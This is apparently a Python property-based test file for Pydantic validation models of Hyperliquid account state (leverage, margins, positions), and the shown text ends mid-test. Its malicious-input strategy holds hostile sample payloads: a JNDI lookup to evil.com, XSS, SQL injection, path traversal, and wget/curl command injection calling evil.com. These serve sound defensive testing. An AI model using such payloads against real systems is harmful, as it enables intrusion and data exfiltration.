"""Property-based tests for Hyperliquid raw user state models.

These tests validate critical security boundary models that process external user state data.
The models tested here are essential for user account tracking, position
management, and margin calculations.

SECURITY CRITICAL: These raw models protect against:
- Malicious user state data that could manipulate account balances and positions
- Financial precision errors in margin calculations and position values
- Buffer overflow attacks through oversized user state structures
- Injection attacks through malformed user state data
- Leverage manipulation that could affect risk management
- Position value manipulation that could affect trading decisions

Property testing ensures comprehensive coverage of user state edge cases and adversarial inputs.
"""

import json
import string
from decimal import Decimal
from typing import Any, cast

import pytest
from hypothesis import assume, given, strategies as st
from hypothesis.strategies import SearchStrategy
from pydantic import ValidationError

from cyberdelta.apis.hyperliquid.models.hl_raw_user_state import (
    HyperliquidRawAssetPosition,
    HyperliquidRawClearinghouseState,
    HyperliquidRawLeverage,
    HyperliquidRawMarginSummary,
    HyperliquidRawPositionInfo,
    HyperliquidRawUserStateRequestPayload,
)
from cyberdelta.exceptions.field_validation import TypeFieldError
from cyberdelta.exceptions.parsing import EmptyStringError


# =============================================================================
# HYPOTHESIS STRATEGIES FOR USER STATE MODEL TESTING
# =============================================================================


def _format_ethereum_address(prefix: str, hex_part: str) -> str:
    """Format Ethereum address from prefix and hex part.
    
    Args:
        prefix: Address prefix (usually '0x')
        hex_part: Hexadecimal part of the address
        
    Returns:
        Formatted Ethereum address
    """
    return f"{prefix}{hex_part}"


def leverage_type_strategy() -> SearchStrategy[str]:
    """Generate valid leverage type strings.

    Returns:
        A Hypothesis strategy for valid leverage type strings.
    """
    return st.sampled_from([
        "cross",
        "isolated",
    ])


def coin_strategy() -> SearchStrategy[str]:
    """Generate valid coin/asset strings.

    Returns:
        A Hypothesis strategy for valid coin/asset strings.
    """
    return st.one_of([
        # Common cryptocurrencies
        st.sampled_from([
            "BTC",
            "ETH",
            "SOL",
            "USDC",
            "USDT",
            "AVAX",
            "ATOM",
            "DOT",
            "LINK",
            "UNI",
            "MATIC",
            "ADA",
            "XRP",
            "DOGE",
            "SHIB",
            "FTM",
            "NEAR",
            "ALGO",
            "MANA",
            "SAND",
        ]),
        # Generated asset names
        st.text(
            min_size=1,
            max_size=32,
            alphabet=st.characters(
                whitelist_categories=["Lu", "Ll", "Nd", "Pc", "Pd"], whitelist_characters="-_"
            ),
        ).filter(lambda x: x.strip() and len(x.encode("utf-8")) <= 64),
    ])


def user_address_strategy() -> SearchStrategy[str]:
    """Generate valid Ethereum-like addresses for user field.

    Returns:
        A Hypothesis strategy for valid Ethereum-like address strings.
    """
    return st.one_of([
        # Valid Ethereum addresses
        st.just("0x742f4d0b8dA87Dd74b2FA0F2f9F0C2e2FdA9f8D9"),
        st.just("0x1234567890abcdef1234567890abcdef12345678"),
        st.just("0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef"),
        # Generated addresses
        st.builds(
            _format_ethereum_address,
            st.just("0x"),
            st.text(min_size=40, max_size=40, alphabet=string.hexdigits),
        ),
    ])


def financial_decimal_strategy() -> SearchStrategy[str]:
    """Generate decimal strings for financial values (account value, PnL, etc.).

    Returns:
        A Hypothesis strategy for financial decimal strings.
    """
    return st.one_of([
        # Common financial values
        st.decimals(min_value=Decimal(-1000000), max_value=Decimal(1000000), places=8).map(str),
        st.decimals(min_value=Decimal(-100000), max_value=Decimal(100000), places=6).map(str),
        # Common values
        st.just("0"),  # Zero value
        st.just("0.0"),  # Zero with decimal
        st.just("100.0"),  # Standard value
        st.just("-50.0"),  # Negative value (PnL/ROE)
        st.just("1000000.123456"),  # Large account value
        st.just("-10000.987654"),  # Large loss
        st.just("0.00000001"),  # Minimum precision
        # Scientific notation (valid for decimal parsing)
        st.just("1e6"),
        st.just("-1.5e3"),
        st.just("2.5e-4"),
    ])


def non_negative_financial_decimal_strategy() -> SearchStrategy[str]:
    """Generate non-negative decimal strings for margin values.

    Returns:
        A Hypothesis strategy for non-negative financial decimal strings.
    """
    return st.one_of([
        # Non-negative financial values
        st.decimals(min_value=Decimal(0), max_value=Decimal(1000000), places=8).map(str),
        st.decimals(min_value=Decimal(0), max_value=Decimal(100000), places=6).map(str),
        # Common values
        st.just("0"),  # Zero value
        st.just("0.0"),  # Zero with decimal
        st.just("100.0"),  # Standard value
        st.just("1000000.123456"),  # Large value
        st.just("0.00000001"),  # Minimum precision
        # Scientific notation
        st.just("1e6"),
        st.just("1.5e3"),
        st.just("2.5e-4"),
    ])


@st.composite
def valid_leverage_data(draw: st.DrawFn) -> dict[str, Any]:
    """Generate valid leverage data.

    Returns:
        A dictionary with valid leverage data fields.
    """
    return {
        "type": draw(leverage_type_strategy()),
        "value": draw(st.integers(min_value=0, max_value=100)),
    }


@st.composite
def valid_margin_summary_data(draw: st.DrawFn) -> dict[str, Any]:
    """Generate valid margin summary data.

    Returns:
        A dictionary with valid margin summary data fields.
    """
    return {
        "accountValue": draw(financial_decimal_strategy()),
        "totalMarginUsed": draw(non_negative_financial_decimal_strategy()),
        "totalNtlPos": draw(financial_decimal_strategy()),
        "totalRawUsd": draw(financial_decimal_strategy()),
    }


@st.composite
def valid_position_info_data(draw: st.DrawFn) -> dict[str, Any]:
    """Generate valid position info data.

    Returns:
        A dictionary with valid position info data fields.
    """
    entry_px = draw(st.one_of([st.none(), financial_decimal_strategy()]))
    liquidation_px = draw(st.one_of([st.none(), financial_decimal_strategy()]))

    return {
        "coin": draw(coin_strategy()),
        "entryPx": entry_px,
        "leverage": draw(valid_leverage_data()),
        "liquidationPx": liquidation_px,
        "marginUsed": draw(non_negative_financial_decimal_strategy()),
        "maxLeverage": draw(st.integers(min_value=0, max_value=100)),
        "positionValue": draw(financial_decimal_strategy()),
        "returnOnEquity": draw(financial_decimal_strategy()),
        "szi": draw(financial_decimal_strategy()),
        "unrealizedPnl": draw(financial_decimal_strategy()),
    }


@st.composite
def valid_asset_position_data(draw: st.DrawFn) -> dict[str, Any]:
    """Generate valid asset position data.

    Returns:
        A dictionary with valid asset position data fields.
    """
    asset = draw(st.one_of([st.none(), coin_strategy()]))
    position_type = draw(st.one_of([st.none(), st.sampled_from(["spot", "perp"])]))

    return {
        "asset": asset,
        "position": draw(valid_position_info_data()),
        "type": position_type,
    }


@st.composite
def valid_clearinghouse_state_data(draw: st.DrawFn) -> dict[str, Any]:
    """Generate valid clearinghouse state data.

    Returns:
        A dictionary with valid clearinghouse state data fields.
    """
    isolated_maintenance_margin_used = draw(
        st.one_of([st.none(), non_negative_financial_decimal_strategy()])
    )
    isolated_margin_summary = draw(st.one_of([st.none(), valid_margin_summary_data()]))
    time_value = draw(st.one_of([st.none(), st.integers(min_value=0, max_value=2**31 - 1)]))

    return {
        "assetPositions": draw(st.lists(valid_asset_position_data(), min_size=0, max_size=5)),
        "marginSummary": draw(valid_margin_summary_data()),
        "crossMaintenanceMarginUsed": draw(non_negative_financial_decimal_strategy()),
        "crossMarginSummary": draw(valid_margin_summary_data()),
        "isolatedMaintenanceMarginUsed": isolated_maintenance_margin_used,
        "isolatedMarginSummary": isolated_margin_summary,
        "withdrawable": draw(non_negative_financial_decimal_strategy()),
        "time": time_value,
    }


@st.composite
def valid_user_state_request_data(draw: st.DrawFn) -> dict[str, Any]:
    """Generate valid user state request payload data.

    Returns:
        A dictionary with valid user state request payload data fields.
    """
    return {
        "type": "clearinghouseState",
        "user": draw(user_address_strategy()),
    }


def malicious_user_state_strategy() -> SearchStrategy[object]:
    """Generate malicious values for user state security testing.

    Returns:
        A Hypothesis strategy for malicious values to test security boundaries.
    """
    return st.one_of([
        # User state manipulation attempts
        st.just("${jndi:ldap://evil.com/steal-state}"),
        st.just("999999999999999999999999999999.99"),  # Overflow attempt
        st.just("../../etc/passwd"),  # Path traversal
        # XSS attempts
        st.just("<script>alert('user-state-xss')</script>"),
        st.just("<img src=x onerror=alert(document.cookie)>"),
        # SQL injection attempts
        st.just("'; DROP TABLE positions;--"),
        st.just("1' UNION SELECT * FROM balances--"),
        # Buffer overflow attempts
        st.text(min_size=10000, max_size=50000),
        st.just("U" * 10000),
        # Unicode attacks
        st.just("\udce2\udc28\udc00"),  # Lone surrogates
        st.just("\x00\x01\x02"),  # Control characters
        # Format string attacks
        st.just("%s%s%s%s%n"),
        st.just("%x%x%x%x"),
        # Command injection
        st.just("; wget evil.com/backdoor"),
        st.just("`curl evil.com/exfiltrate`"),
        # NoSQL injection
        st.just("'; return db.positions.find(); //"),
        # JSON injection
        st.just('{"$where": "this.balance > 1000000"}'),
        # User state manipulation
        st.just("1000.0'; UPDATE balances SET amount=0;--"),
        # Type confusion
        st.none(),
        st.integers(),
        st.floats(),
        st.booleans(),
        st.lists(st.text()),
        st.dictionaries(st.text(), st.text()),
        st.binary(),
    ])


# =============================================================================
# PROPERTY TESTS FOR HYPERLIQUID RAW LEVERAGE MODEL
# =============================================================================


class TestHyperliquidRawLeverageProperties:
    """Property-based tests for HyperliquidRawLeverage validation and security."""

    @given(leverage_data=valid_leverage_data())
    def test_leverage_validation_success_properties(self, leverage_data: dict[str, Any]) -> None:
        """Property: Valid leverage data should always create valid HyperliquidRaw.
        
        Leverage
        objects.
        """
        obj = HyperliquidRawLeverage.model_validate(leverage_data)

        # Property: Object should be created successfully
        assert isinstance(obj, HyperliquidRawLeverage)

        # Property: All fields should be preserved with correct types
        assert obj.type == leverage_data["type"]
        assert obj.value == leverage_data["value"]

        # Property: Model should be configured correctly
        assert obj.model_config.get("extra") == "forbid"
        assert obj.model_config.get("populate_by_name") is True
        assert obj.model_config.get("frozen") is True

    @given(
        field_name=st.sampled_from(["type", "value"]),
        malicious_value=malicious_user_state_strategy(),
    )
    def test_leverage_security_boundary_properties(
        self, field_name: str, malicious_value: object
    ) -> None:
        """Property: Leverage model should reject malicious inputs safely."""
        base_data: dict[str, str | int | object] = {
            "type": "cross",
            "value": 5,
        }
        base_data[field_name] = malicious_value

        # Property: Malicious input should be rejected
        with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
            HyperliquidRawLeverage.model_validate(base_data)

    @given(
        leverage_type=st.one_of([
            # Valid types
            st.just("cross"),
            st.just("isolated"),
            # Invalid types
            st.just("CROSS"),
            st.just("Isolated"),
            st.just("margin"),
            st.just("spot"),
            st.just("invalid"),
            st.just(""),
            st.just("   "),
        ])
    )
    def test_leverage_type_validation_properties(self, leverage_type: str) -> None:
        """Property: Leverage type field should validate against allowed values."""
        leverage_data = {
            "type": leverage_type,
            "value": 5,
        }

        if leverage_type in ["cross", "isolated"]:
            # Property: Valid leverage types should be accepted
            obj = HyperliquidRawLeverage.model_validate(leverage_data)
            assert obj.type == leverage_type
        else:
            # Property: Invalid leverage types should be rejected
            with pytest.raises(ValidationError):
                HyperliquidRawLeverage.model_validate(leverage_data)

    @given(
        leverage_value=st.one_of([
            # Valid values
            st.integers(min_value=0, max_value=100),
            # Invalid values
            st.integers(min_value=-1000, max_value=-1),
            st.integers(min_value=101, max_value=1000),
        ])
    )
    def test_leverage_value_validation_properties(self, leverage_value: int) -> None:
        """Property: Leverage value field should validate non-negative integers."""
        leverage_data = {
            "type": "cross",
            "value": leverage_value,
        }

        if leverage_value >= 0:
            # Property: Non-negative values should be accepted
            obj = HyperliquidRawLeverage.model_validate(leverage_data)
            assert obj.value == leverage_value
        else:
            # Property: Negative values should be rejected
            with pytest.raises(ValidationError):
                HyperliquidRawLeverage.model_validate(leverage_data)

    @given(leverage_data=valid_leverage_data())
    def test_leverage_extra_fields_properties(self, leverage_data: dict[str, Any]) -> None:
        """Property: Leverage model should forbid extra fields."""
        # Add extra fields
        leverage_data_with_extra = leverage_data.copy()
        leverage_data_with_extra["extra"] = "forbidden"
        leverage_data_with_extra["malicious"] = {"nested": "data"}

        # Property: Extra fields should be rejected
        with pytest.raises(ValidationError):
            HyperliquidRawLeverage.model_validate(leverage_data_with_extra)


# =============================================================================
# PROPERTY TESTS FOR HYPERLIQUID RAW MARGIN SUMMARY MODEL
# =============================================================================


class TestHyperliquidRawMarginSummaryProperties:
    """Property-based tests for HyperliquidRawMarginSummary validation and security."""

    @given(margin_data=valid_margin_summary_data())
    def test_margin_summary_validation_success_properties(
        self, margin_data: dict[str, Any]
    ) -> None:
        """Property: Valid margin summary data should always create valid HyperliquidRaw.
        
        MarginSummary
        objects.
        """
        # Skip invalid data
        for field in ["accountValue", "totalMarginUsed", "totalNtlPos", "totalRawUsd"]:
            value = margin_data[field]
            assume(isinstance(value, str) and value.strip())
            try:
                decimal_val = Decimal(value)
                assume(decimal_val.is_finite())
                if field == "totalMarginUsed":
                    assume(decimal_val >= 0)
            except (ValueError, TypeError):
                assume(False)

        obj = HyperliquidRawMarginSummary.model_validate(margin_data)

        # Property: Object should be created successfully
        assert isinstance(obj, HyperliquidRawMarginSummary)

        # Property: All fields should be preserved with correct types
        assert isinstance(obj.account_value, str)
        assert isinstance(obj.total_margin_used, str)
        assert isinstance(obj.total_ntl_pos, str)
        assert isinstance(obj.total_raw_usd, str)

    @given(
        field_name=st.sampled_from([
            "accountValue",
            "totalMarginUsed",
            "totalNtlPos",
            "totalRawUsd",
        ]),
        malicious_value=malicious_user_state_strategy(),
    )
    def test_margin_summary_security_boundary_properties(
        self, field_name: str, malicious_value: object
    ) -> None:
        """Property: Margin summary model should reject malicious inputs safely."""
        base_data: dict[str, object] = {
            "accountValue": "1000.0",
            "totalMarginUsed": "100.0",
            "totalNtlPos": "200.0",
            "totalRawUsd": "1000.0",
        }
        base_data[field_name] = malicious_value

        # Property: Malicious input should be rejected
        with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
            HyperliquidRawMarginSummary.model_validate(base_data)

    @given(
        field_name=st.sampled_from([
            "accountValue",
            "totalMarginUsed",
            "totalNtlPos",
            "totalRawUsd",
        ]),
        decimal_value=st.one_of([
            # Valid decimals
            st.just("0"),
            st.just("100.50"),
            st.just("-50.25"),
            st.just("1e6"),
            st.just("-2.5e-4"),
            # Invalid decimals
            st.just("NaN"),
            st.just("inf"),
            st.just("-inf"),
            st.just("Infinity"),
            st.just("-Infinity"),
            st.just("1..0"),
            st.just("not_a_number"),
            st.just(""),
            st.just("   "),
        ]),
    )
    def test_margin_summary_decimal_validation_properties(
        self, field_name: str, decimal_value: str
    ) -> None:
        """Property: Margin summary decimal fields should validate properly."""
        margin_data = {
            "accountValue": "1000.0",
            "totalMarginUsed": "100.0",
            "totalNtlPos": "200.0",
            "totalRawUsd": "1000.0",
        }
        margin_data[field_name] = decimal_value

        try:
            # Check if the value can be parsed as a finite decimal
            decimal_val = Decimal(decimal_value.strip() if decimal_value else "")
            is_finite = decimal_val.is_finite()
            is_empty = not decimal_value.strip()
            is_non_negative = decimal_val >= 0

            if is_finite and not is_empty:
                # For totalMarginUsed, also check non-negative constraint
                if field_name == "totalMarginUsed" and not is_non_negative:
                    # Property: Negative margin values should be rejected
                    with pytest.raises(ValidationError):
                        HyperliquidRawMarginSummary.model_validate(margin_data)
                else:
                    # Property: Valid finite decimals should be accepted
                    obj = HyperliquidRawMarginSummary.model_validate(margin_data)
                    assert isinstance(
                        getattr(
                            obj,
                            field_name.replace("V", "_v")
                            .replace("U", "_u")
                            .replace("P", "_p")
                            .lower(),
                        ),
                        str,
                    )
            else:
                # Property: Non-finite or empty values should be rejected
                with pytest.raises(ValidationError):
                    HyperliquidRawMarginSummary.model_validate(margin_data)

        except (ValueError, TypeError):
            # Property: Unparseable decimal strings should be rejected
            with pytest.raises(ValidationError):
                HyperliquidRawMarginSummary.model_validate(margin_data)

    @given(margin_data=valid_margin_summary_data())
    def test_margin_summary_extra_fields_properties(self, margin_data: dict[str, Any]) -> None:
        """Property: Margin summary model should forbid extra fields."""
        # Skip invalid data
        for field in ["accountValue", "totalMarginUsed", "totalNtlPos", "totalRawUsd"]:
            assume(isinstance(margin_data[field], str) and margin_data[field].strip())

        # Add extra fields
        margin_data_with_extra = margin_data.copy()
        margin_data_with_extra["extra"] = "forbidden"
        margin_data_with_extra["balance"] = "1000.0"

        # Property: Extra fields should be rejected
        with pytest.raises(ValidationError):
            HyperliquidRawMarginSummary.model_validate(margin_data_with_extra)


# =============================================================================
# PROPERTY TESTS FOR HYPERLIQUID RAW POSITION INFO MODEL
# =============================================================================


class TestHyperliquidRawPositionInfoProperties:
    """Property-based tests for HyperliquidRawPositionInfo validation and security."""

    @given(position_data=valid_position_info_data())
    def test_position_info_validation_success_properties(
        self, position_data: dict[str, Any]
    ) -> None:
        """Property: Valid position info data should always create valid HyperliquidRaw.
        
        PositionInfo
        objects.
        """
        # Skip invalid data
        try:
            # Validate required string fields
            assume(isinstance(position_data["coin"], str) and position_data["coin"].strip())

            # Validate decimal fields
            for field in ["marginUsed", "positionValue", "returnOnEquity", "szi", "unrealizedPnl"]:
                value = position_data[field]
                assume(isinstance(value, str) and value.strip())
                decimal_val = Decimal(value)
                assume(decimal_val.is_finite())
                if field == "marginUsed":
                    assume(decimal_val >= 0)

            # Validate optional decimal fields
            for field in ["entryPx", "liquidationPx"]:
                value = position_data.get(field)
                if value is not None:
                    assume(isinstance(value, str) and value.strip())
                    decimal_val = Decimal(value)
                    assume(decimal_val.is_finite())

            # Validate leverage
            leverage = position_data["leverage"]
            assume(isinstance(leverage, dict))
            assume(leverage.get("type") in ["cross", "isolated"])
            assume(isinstance(leverage.get("value"), int) and leverage.get("value") >= 0)

            # Validate max_leverage
            max_leverage = position_data["maxLeverage"]
            assume(isinstance(max_leverage, int) and max_leverage >= 0)

        except (ValueError, TypeError, KeyError):
            assume(False)

        obj = HyperliquidRawPositionInfo.model_validate(position_data)

        # Property: Object should be created successfully
        assert isinstance(obj, HyperliquidRawPositionInfo)

        # Property: All fields should be preserved with correct types
        assert obj.coin == position_data["coin"]
        assert isinstance(obj.leverage, HyperliquidRawLeverage)
        assert obj.max_leverage == position_data["maxLeverage"]

    @given(
        field_name=st.sampled_from([
            "coin",
            "entryPx",
            "leverage",
            "liquidationPx",
            "marginUsed",
            "maxLeverage",
            "positionValue",
            "returnOnEquity",
            "szi",
            "unrealizedPnl",
        ]),
        malicious_value=malicious_user_state_strategy(),
    )
    def test_position_info_security_boundary_properties(
        self, field_name: str, malicious_value: object
    ) -> None:
        """Property: Position info model should reject malicious inputs safely."""
        base_data: dict[str, str | dict[str, str | int] | int | object] = {
            "coin": "ETH",
            "entryPx": "1234.56",
            "leverage": {"type": "cross", "value": 5},
            "liquidationPx": "1000.00",
            "marginUsed": "100.00",
            "maxLeverage": 10,
            "positionValue": "200.00",
            "returnOnEquity": "0.05",
            "szi": "1.0",
            "unrealizedPnl": "0.01",
        }
        base_data[field_name] = malicious_value

        # Property: Malicious input should be rejected
        with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
            HyperliquidRawPositionInfo.model_validate(base_data)

    @given(position_data=valid_position_info_data())
    def test_position_info_optional_fields_properties(self, position_data: dict[str, Any]) -> None:
        """Property: Position info optional fields should handle None values properly."""
        # Skip invalid data
        try:
            assume(isinstance(position_data["coin"], str) and position_data["coin"].strip())
        except (TypeError, KeyError):
            assume(False)

        # Set optional fields to None
        position_data_with_none = position_data.copy()
        position_data_with_none["entryPx"] = None
        position_data_with_none["liquidationPx"] = None

        # Property: None values should be accepted for optional fields
        obj = HyperliquidRawPositionInfo.model_validate(position_data_with_none)
        assert obj.entry_px is None
        assert obj.liquidation_px is None

    @given(position_data=valid_position_info_data())
    def test_position_info_extra_fields_properties(self, position_data: dict[str, Any]) -> None:
        """Property: Position info model should forbid extra fields."""
        # Skip invalid data
        try:
            assume(isinstance(position_data["coin"], str) and position_data["coin"].strip())
        except (TypeError, KeyError):
            assume(False)

        # Add extra fields
        position_data_with_extra = position_data.copy()
        position_data_with_extra["extra"] = "forbidden"
        position_data_with_extra["size"] = "1.0"

        # Property: Extra fields should be rejected
        with pytest.raises(ValidationError):
            HyperliquidRawPositionInfo.model_validate(position_data_with_extra)


# =============================================================================
# PROPERTY TESTS FOR HYPERLIQUID RAW ASSET POSITION MODEL
# =============================================================================


class TestHyperliquidRawAssetPositionProperties:
    """Property-based tests for HyperliquidRawAssetPosition validation and security."""

    @given(asset_position_data=valid_asset_position_data())
    def test_asset_position_validation_success_properties(
        self, asset_position_data: dict[str, Any]
    ) -> None:
        """Property: Valid asset position data should always create valid HyperliquidRaw.
        
        AssetPosition
        objects.
        """
        # Skip invalid data
        try:
            # Validate position data
            position = asset_position_data["position"]
            assume(isinstance(position, dict))
            assume(isinstance(position.get("coin"), str) and position.get("coin", "").strip())

            # Validate asset field (optional)
            asset = asset_position_data.get("asset")
            if asset is not None:
                assume(isinstance(asset, str) and asset.strip())
        except (TypeError, KeyError):
            assume(False)

        obj = HyperliquidRawAssetPosition.model_validate(asset_position_data)

        # Property: Object should be created successfully
        assert isinstance(obj, HyperliquidRawAssetPosition)

        # Property: Position should be properly nested
        assert isinstance(obj.position, HyperliquidRawPositionInfo)

    @given(
        field_name=st.sampled_from(["asset", "position", "type"]),
        malicious_value=malicious_user_state_strategy(),
    )
    def test_asset_position_security_boundary_properties(
        self, field_name: str, malicious_value: object
    ) -> None:
        """Property: Asset position model should reject malicious inputs safely."""
        base_data: dict[str, object] = {
            "asset": "ETH",
            "position": {
                "coin": "ETH",
                "entryPx": "1234.56",
                "leverage": {"type": "cross", "value": 5},
                "liquidationPx": "1000.00",
                "marginUsed": "100.00",
                "maxLeverage": 10,
                "positionValue": "200.00",
                "returnOnEquity": "0.05",
                "szi": "1.0",
                "unrealizedPnl": "0.01",
            },
            "type": "perp",
        }
        base_data[field_name] = malicious_value

        # Property: Malicious input should be rejected
        with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
            HyperliquidRawAssetPosition.model_validate(base_data)

    @given(asset_position_data=valid_asset_position_data())
    def test_asset_position_optional_fields_properties(
        self, asset_position_data: dict[str, Any]
    ) -> None:
        """Property: Asset position optional fields should handle None values properly."""
        # Skip invalid data
        try:
            position = asset_position_data["position"]
            assume(isinstance(position, dict))
            assume(isinstance(position.get("coin"), str) and position.get("coin", "").strip())
        except (TypeError, KeyError):
            assume(False)

        # Set optional fields to None
        asset_position_data_with_none = asset_position_data.copy()
        asset_position_data_with_none["asset"] = None
        asset_position_data_with_none["type"] = None

        # Property: None values should be accepted for optional fields
        obj = HyperliquidRawAssetPosition.model_validate(asset_position_data_with_none)
        assert obj.asset is None
        assert obj.type is None


# =============================================================================
# PROPERTY TESTS FOR HYPERLIQUID RAW CLEARINGHOUSE STATE MODEL
# =============================================================================


class TestHyperliquidRawClearinghouseStateProperties:
    """Property-based tests for HyperliquidRawClearinghouseState validation and security."""

    @given(state_data=valid_clearinghouse_state_data())
    def test_clearinghouse_state_validation_success_properties(
        self, state_data: dict[str, Any]
    ) -> None:
        """Property: Valid clearinghouse state data should always create valid HyperliquidRaw.
        
        ClearinghouseState
        objects.
        """
        # Skip invalid data
        try:
            # Validate required decimal fields
            for field in ["crossMaintenanceMarginUsed", "withdrawable"]:
                value = state_data[field]
                assume(isinstance(value, str) and value.strip())
                decimal_val = Decimal(value)
                assume(decimal_val.is_finite() and decimal_val >= 0)

            # Validate optional decimal fields
            isolated_margin = state_data.get("isolatedMaintenanceMarginUsed")
            if isolated_margin is not None:
                assume(isinstance(isolated_margin, str) and isolated_margin.strip())
                decimal_val = Decimal(isolated_margin)
                assume(decimal_val.is_finite() and decimal_val >= 0)

            # Validate margin summaries
            for summary_field in ["marginSummary", "crossMarginSummary"]:
                summary = state_data[summary_field]
                assume(isinstance(summary, dict))
                for field in ["accountValue", "totalMarginUsed", "totalNtlPos", "totalRawUsd"]:
                    value = summary[field]
                    assume(isinstance(value, str) and value.strip())
                    decimal_val = Decimal(value)
                    assume(decimal_val.is_finite())

            # Validate asset positions
            positions = state_data["assetPositions"]
            assume(isinstance(positions, list))
            for position in positions:
                assume(isinstance(position, dict))
                pos_info = position["position"]
                assume(isinstance(pos_info, dict))
                assume(isinstance(pos_info.get("coin"), str) and pos_info.get("coin", "").strip())
        except (ValueError, TypeError, KeyError):
            assume(False)

        obj = HyperliquidRawClearinghouseState.model_validate(state_data)

        # Property: Object should be created successfully
        assert isinstance(obj, HyperliquidRawClearinghouseState)

        # Property: All required fields should be properly typed
        assert isinstance(obj.asset_positions, list)
        assert isinstance(obj.margin_summary, HyperliquidRawMarginSummary)
        assert isinstance(obj.cross_margin_summary, HyperliquidRawMarginSummary)

    @given(
        field_name=st.sampled_from([
            "assetPositions",
            "marginSummary",
            "crossMaintenanceMarginUsed",
            "crossMarginSummary",
            "isolatedMaintenanceMarginUsed",
            "isolatedMarginSummary",
            "withdrawable",
            "time",
        ]),
        malicious_value=malicious_user_state_strategy(),
    )
    def test_clearinghouse_state_security_boundary_properties(
        self, field_name: str, malicious_value: object
    ) -> None:
        """Property: Clearinghouse state model should reject malicious inputs safely."""
        base_data: dict[str, Any] = {
            "assetPositions": [],
            "marginSummary": {
                "accountValue": "1000.0",
                "totalMarginUsed": "100.0",
                "totalNtlPos": "200.0",
                "totalRawUsd": "1000.0",
            },
            "crossMaintenanceMarginUsed": "10.00",
            "crossMarginSummary": {
                "accountValue": "1000.0",
                "totalMarginUsed": "100.0",
                "totalNtlPos": "200.0",
                "totalRawUsd": "1000.0",
            },
            "isolatedMaintenanceMarginUsed": "5.00",
            "isolatedMarginSummary": {
                "accountValue": "500.0",
                "totalMarginUsed": "50.0",
                "totalNtlPos": "100.0",
                "totalRawUsd": "500.0",
            },
            "withdrawable": "50.00",
            "time": 1641886630,
        }
        base_data[field_name] = cast(Any, malicious_value)

        # Property: Malicious input should be rejected
        with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
            HyperliquidRawClearinghouseState.model_validate(base_data)

    @given(state_data=valid_clearinghouse_state_data())
    def test_clearinghouse_state_optional_fields_properties(
        self, state_data: dict[str, Any]
    ) -> None:
        """Property: Clearinghouse state optional fields should handle None values properly."""
        # Skip invalid data
        try:
            # Basic validation
            assume(isinstance(state_data["assetPositions"], list))
            assume(isinstance(state_data["marginSummary"], dict))
        except (TypeError, KeyError):
            assume(False)

        # Set optional fields to None
        state_data_with_none = state_data.copy()
        state_data_with_none["isolatedMaintenanceMarginUsed"] = None
        state_data_with_none["isolatedMarginSummary"] = None
        state_data_with_none["time"] = None

        # Property: None values should be accepted for optional fields
        obj = HyperliquidRawClearinghouseState.model_validate(state_data_with_none)
        assert obj.isolated_maintenance_margin_used is None
        assert obj.isolated_margin_summary is None
        assert obj.time is None


# =============================================================================
# PROPERTY TESTS FOR HYPERLIQUID RAW USER STATE REQUEST PAYLOAD MODEL
# =============================================================================


class TestHyperliquidRawUserStateRequestPayloadProperties:
    """Property-based tests for HyperliquidRawUserStateRequestPayload validation and security."""

    @given(request_data=valid_user_state_request_data())
    def test_user_state_request_validation_success_properties(
        self, request_data: dict[str, Any]
    ) -> None:
        """Property: Valid user state request data should always create valid HyperliquidRaw.
        
        UserStateRequestPayload
        objects.
        """
        obj = HyperliquidRawUserStateRequestPayload.model_validate(request_data)

        # Property: Object should be created successfully
        assert isinstance(obj, HyperliquidRawUserStateRequestPayload)

        # Property: All fields should be preserved with correct types
        assert obj.type == "clearinghouseState"
        assert obj.user == request_data["user"]

    @given(
        field_name=st.sampled_from(["type", "user"]),
        malicious_value=malicious_user_state_strategy(),
    )
    def test_user_state_request_security_boundary_properties(
        self, field_name: str, malicious_value: object
    ) -> None:
        """Property: User state request model should reject malicious inputs safely."""
        base_data: dict[str, object] = {
            "type": "clearinghouseState",
            "user": "0x742f4d0b8dA87Dd74b2FA0F2f9F0C2e2FdA9f8D9",
        }
        base_data[field_name] = malicious_value

        # Property: Malicious input should be rejected
        with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
            HyperliquidRawUserStateRequestPayload.model_validate(base_data)

    @given(
        request_type=st.one_of([
            st.just("clearinghouseState"),
            st.just("clearinghouse"),
            st.just("state"),
            st.just("userState"),
            st.just("invalid"),
            st.just(""),
        ])
    )
    def test_user_state_request_type_validation_properties(self, request_type: str) -> None:
        """Property: User state request type field should validate against literal value."""
        request_data = {
            "type": request_type,
            "user": "0x742f4d0b8dA87Dd74b2FA0F2f9F0C2e2FdA9f8D9",
        }

        if request_type == "clearinghouseState":
            # Property: Valid type should be accepted
            obj = HyperliquidRawUserStateRequestPayload.model_validate(request_data)
            assert obj.type == "clearinghouseState"
        else:
            # Property: Invalid types should be rejected
            with pytest.raises(ValidationError):
                HyperliquidRawUserStateRequestPayload.model_validate(request_data)


# =============================================================================
# INTEGRATION TESTS WITH MIXED PROPERTY SCENARIOS
# =============================================================================


class TestHyperliquidRawUserStateIntegrationProperties:
    """Integration property tests for user state models working together."""

    @given(
        state_data=valid_clearinghouse_state_data(),
        malicious_position=malicious_user_state_strategy(),
    )
    def test_user_state_models_integration_properties(
        self, state_data: dict[str, Any], malicious_position: object
    ) -> None:
        """Property: User state models should work consistently together."""
        # Skip invalid data
        try:
            assume(isinstance(state_data["assetPositions"], list))
            assume(isinstance(state_data["marginSummary"], dict))
        except (TypeError, KeyError):
            assume(False)

        # Property: Valid data should create valid objects
        if state_data["assetPositions"]:  # Only test if not empty
            response_obj = HyperliquidRawClearinghouseState.model_validate(state_data)
            assert isinstance(response_obj, HyperliquidRawClearinghouseState)

            # Test first asset position
            first_position = response_obj.asset_positions[0]
            assert isinstance(first_position, HyperliquidRawAssetPosition)
            assert isinstance(first_position.position, HyperliquidRawPositionInfo)

        # Property: Malicious position should be rejected when injected
        if state_data["assetPositions"]:
            corrupted_data = state_data.copy()
            corrupted_data["assetPositions"][0] = malicious_position

            with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
                HyperliquidRawClearinghouseState.model_validate(corrupted_data)

    @given(
        complete_malicious_data=st.dictionaries(
            st.sampled_from([
                "assetPositions",
                "marginSummary",
                "crossMaintenanceMarginUsed",
